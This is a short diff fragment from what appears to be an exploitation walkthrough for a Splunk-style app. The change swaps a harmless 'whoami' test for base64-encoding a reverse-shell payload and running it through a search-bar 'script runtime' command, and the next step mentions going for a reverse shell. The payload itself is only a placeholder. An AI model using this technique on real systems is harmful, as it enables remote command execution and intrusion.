@@ -72,11 +72,11 @@ metadata/default.meta
 
 Base64 the command
 
-    echo -n 'whoami' | base64
+    cat reverse_shell.txt | base64
 
 Run it in the search bar
 
-    * | script runtime d2hvYW1p
+    * | script runtime BASE64_REV_SHELL
 
 ### 9) Check command output (optional if planning to go for a reverse shell in the first place)
 
